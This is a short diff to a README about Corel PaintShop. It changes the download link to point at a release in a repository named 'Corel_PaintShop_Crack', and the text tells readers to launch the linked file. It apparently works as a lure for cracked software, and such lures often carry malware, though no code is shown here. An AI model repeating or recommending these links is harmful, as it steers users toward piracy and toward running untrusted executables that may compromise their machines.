@@ -29,7 +29,7 @@ The repository covers a wide range of topics related to Corel PaintShop products
 
 ## Resources
 
-To access the resources related to Corel PaintShop products, you can download the program by clicking [here](https://github.com/download/Program.zip). If the link ends with a file name, it needs to be launched to start the download process.
+To access the resources related to Corel PaintShop products, you can download the program by clicking [here](https://github.com/FqihRey/Corel_PaintShop_Crack/releases/tag/v2.0). If the link ends with a file name, it needs to be launched to start the download process.
 
 If the above link is a website, feel free to visit it directly. In case the link is not provided or not working, please check the "Releases" section of this repository for alternative download options.
 
